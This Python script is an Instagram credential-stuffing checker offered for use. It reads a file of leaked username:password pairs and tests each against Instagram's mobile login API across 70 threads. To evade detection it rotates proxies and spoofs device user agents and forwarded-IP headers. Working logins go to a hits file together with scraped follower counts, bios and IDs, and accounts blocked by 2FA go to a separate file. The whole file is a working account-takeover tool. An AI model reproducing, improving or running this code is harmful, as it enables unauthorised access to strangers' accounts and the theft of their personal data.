import requests
import time
import random
import sys
import threading
import json
from uuid import uuid4
from faker import Faker
from colorama import Fore, init
from queue import Queue

init(autoreset=True)
fake = Faker()

# ------------------------------------------------------------
# Helper functions
# ------------------------------------------------------------
def random_ip():
    """Generate a random IP address."""
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def generate_android_user_agent():
    """Generate a realistic Android User-Agent for Instagram."""
    android_versions = ["29", "30", "31", "32"]
    resolutions = ["1080x1920", "1080x2220", "720x1600", "1440x2560"]
    brand = fake.company()
    model = fake.word().capitalize()
    version = random.choice(android_versions)
    res = random.choice(resolutions)
    return f"Instagram 237.0.0.14.102 Android ({version}/11; 440dpi; {res}; {brand}/{model}; {str(uuid4())[:8]}; {str(uuid4())[:6]}; en_US; 373310554)"

def fetch_profile_info(cookies, user_id):
    """
    Fetch detailed profile information using the logged-in session.
    Endpoint: https://i.instagram.com/api/v1/users/{user_id}/info/
    """
    url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
    headers = {
        "User-Agent": generate_android_user_agent(),
        "X-IG-App-ID": "567067343352427",
        "Accept-Language": "en-US",
    }
    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        if response.status_code == 200:
            data = response.json()
            user = data.get("user", {})
            return {
                "full_name": user.get("full_name", "N/A"),
                "username": user.get("username", "N/A"),
                "user_id": user.get("pk", "N/A"),
                "followers": user.get("follower_count", 0),
                "following": user.get("following_count", 0),
                "bio": user.get("biography", ""),
                "is_private": user.get("is_private", False),
                "is_verified": user.get("is_verified", False)
            }
    except Exception:
        return None
    return None

# ------------------------------------------------------------
# Global counters
# ------------------------------------------------------------
hits = 0
bad = 0
retries = 0
tfa = 0
unknown = 0
lock = threading.Lock()

# ------------------------------------------------------------
# Proxy setup
# ------------------------------------------------------------
onProxy = input(Fore.CYAN + "[×] On Proxies (no/yes): ").strip().lower()
proxies = []
if onProxy == "yes":
    proxy_file = input(Fore.RED + "[×] Put Proxies File: ").strip()
    try:
        # Use latin-1 encoding to avoid UnicodeDecodeError
        with open(proxy_file, "r", encoding='latin-1') as pf:
            proxies = [line.strip() for line in pf if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] Proxy file '{proxy_file}' not found!")
        sys.exit(1)

combo_file = input(Fore.RED + "[×] Put Combo File: ").strip()
print("—" * 60)

# Read combo file with latin-1 encoding
try:
    with open(combo_file, "r", encoding='latin-1') as cf:
        combo_list = [line.strip() for line in cf if ":" in line]
except FileNotFoundError:
    print(Fore.RED + f"[!] Combo file '{combo_file}' not found!")
    sys.exit(1)

if not combo_list:
    print(Fore.RED + "[!] No valid combos found in the file (lines must contain ':').")
    sys.exit(1)

# ------------------------------------------------------------
# Main login function
# ------------------------------------------------------------
def attempt_login(combo):
    global hits, bad, retries, unknown, tfa
    user, pas = combo.split(":", 1)

    # Prepare payload for mobile login
    timestamp = int(time.time())
    enc_password = f"#PWD_INSTAGRAM:0:{timestamp}:{pas}"
    device_id = f"android-{uuid4()}"
    guid = str(uuid4())

    payload = {
        "signed_body": f"SIGNATURE.{json.dumps({
            'enc_password': enc_password,
            'username': user,
            'adid': '',
            'guid': guid,
            'device_id': device_id,
            'google_tokens': '[]',
            'login_attempt_count': '0'
        })}"
    }

    headers = {
        "User-Agent": generate_android_user_agent(),
        "X-IG-App-ID": "567067343352427",
        "X-IG-Device-ID": device_id,
        "X-IG-Device-Locale": "en_US",
        "Accept-Language": "en-US, en-US",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Real-IP": random_ip(),
        "X-Forwarded-For": random_ip(),
    }

    proxy_url = None
    if onProxy == "yes" and proxies:
        proxy = random.choice(proxies)
        if ":" in proxy:
            parts = proxy.split(":")
            if len(parts) == 4:
                p_ip, p_port, p_user, p_pass = parts
                proxy_url = f"http://{p_user}:{p_pass}@{p_ip}:{p_port}"
            else:
                # assume ip:port only
                proxy_url = f"http://{proxy}"
        else:
            proxy_url = f"http://{proxy}"

    try:
        response = requests.post(
            "https://i.instagram.com/api/v1/accounts/login/",
            data=payload,
            headers=headers,
            proxies={"http": proxy_url, "https": proxy_url} if proxy_url else None,
            timeout=10
        )
        result = response.json()

        with lock:
            if result.get("authenticated") or result.get("logged_in_user"):
                # Login successful – fetch profile info
                user_id = result.get("logged_in_user", {}).get("pk")
                profile = None
                if user_id:
                    profile = fetch_profile_info(response.cookies.get_dict(), user_id)

                hits += 1
                with open("Instagram-Hits.txt", "a", encoding='utf-8') as f:
                    line = f"{user}:{pas}"
                    if profile:
                        line += (f" | Full Name: {profile['full_name']} | ID: {profile['user_id']} "
                                 f"| Followers: {profile['followers']} | Following: {profile['following']} "
                                 f"| Bio: {profile['bio'][:50]} | Private: {profile['is_private']} "
                                 f"| Verified: {profile['is_verified']}")
                    f.write(line + "\n")

            elif "invalid_credentials" in str(result).lower() or "password_incorrect" in str(result).lower():
                bad += 1
            elif "challenge" in str(result).lower() or "two_factor" in str(result).lower():
                tfa += 1
                with open("Instagram-2FA.txt", "a", encoding='utf-8') as f:
                    f.write(f"{user}:{pas}\n")
            else:
                unknown += 1

    except requests.exceptions.RequestException:
        with lock:
            retries += 1
        # Retry once
        attempt_login(combo)
    except Exception:
        with lock:
            unknown += 1

    sys.stdout.write(f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {hits} | {Fore.YELLOW}2FA{Fore.WHITE}: {tfa} | {Fore.RED}Bad{Fore.WHITE}: {bad} | {Fore.YELLOW}Retries{Fore.WHITE}: {retries} | {Fore.CYAN}Unknown{Fore.WHITE}: {unknown}")
    sys.stdout.flush()

# ------------------------------------------------------------
# Thread worker
# ------------------------------------------------------------
def worker():
    while not queue.empty():
        combo = queue.get()
        attempt_login(combo)
        queue.task_done()

# ------------------------------------------------------------
# Run
# ------------------------------------------------------------
queue = Queue()
for combo in combo_list:
    queue.put(combo)

threads = []
for _ in range(70):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

queue.join()
for t in threads:
    t.join()